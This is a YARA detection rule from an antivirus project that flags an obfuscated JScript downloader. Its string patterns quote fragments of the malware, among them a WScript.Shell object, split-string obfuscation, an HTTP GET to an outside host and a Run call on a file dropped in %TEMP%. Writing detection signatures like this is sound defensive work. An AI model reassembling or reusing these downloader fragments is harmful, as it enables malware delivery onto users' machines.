rule sig_20160427_2a607a46456b83619dfcfced52ca85d3 {
  meta:
    description = "datamaliciousorder - file 20160427_2a607a46456b83619dfcfced52ca85d3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ee652e31be7b8cef241c33677004cc1df7094a2b9602923af155e31165690747"

  strings:
    $s1  = "MfdgkSysrr[GixahZdgfd](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "function XyocqLkchy() {return ZxxckOpcme[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"xsmXxfA" ascii
    $s3  = "function XyocqLkchy() {return ZxxckOpcme[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"xsmXxfA" ascii
    $s4  = "var ZxxckOpcme = function AyusiLfuae() {return RmsdiYhaft[AgoowUewtn](\"WScript\"+\".Shell\");}(), TwhfiMxrfj = 11;" fullword ascii
    $s5  = "function UhxgmQsafu(AdrmeLqazd, UopgaDsfki){XlbsyGecnb = XlbsyGecnb * 1; return AdrmeLqazd - UopgaDsfki;};" fullword ascii
    $s6  = "var RmsdiYhaft = this[\"WScript\"];" fullword ascii
    $s7  = "function CcwpaUaymq(){return TtaplMohqm + \"\";};" fullword ascii
    $s8  = "if (MfdgkSysrr[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function OubxxLdpft() {return ((SjtwiIlpdc == true) && (SjtwiIlpdc == UvghgYcqib)) ? 1 : XlbsyGecnb;};" fullword ascii
    $s10 = "UvghgYcqib = true; " fullword ascii
    $s11 = "function DxqqpVchbg(){return 23;};" fullword ascii
    $s12 = "function PmzcvWfzhr(){return AgoowUewtn;};" fullword ascii
    $s13 = "SjtwiIlpdc = true; " fullword ascii
    $s14 = "var UvghgYcqib = false;" fullword ascii
    $s15 = "function KelwwSpviv()" fullword ascii
    $s16 = "var IwykqCxgvo = false;" fullword ascii
    $s17 = "var NfpykDoert = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "IwykqCxgvo = true;" fullword ascii
    $s19 = "function HphfgRjpaj(YrznwPnazm){ZxxckOpcme[\"R\"+\"un\"](YrznwPnazm, XlbsyGecnb, XlbsyGecnb);};" fullword ascii
    $s20 = "}while (UpbdsBlvfd);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}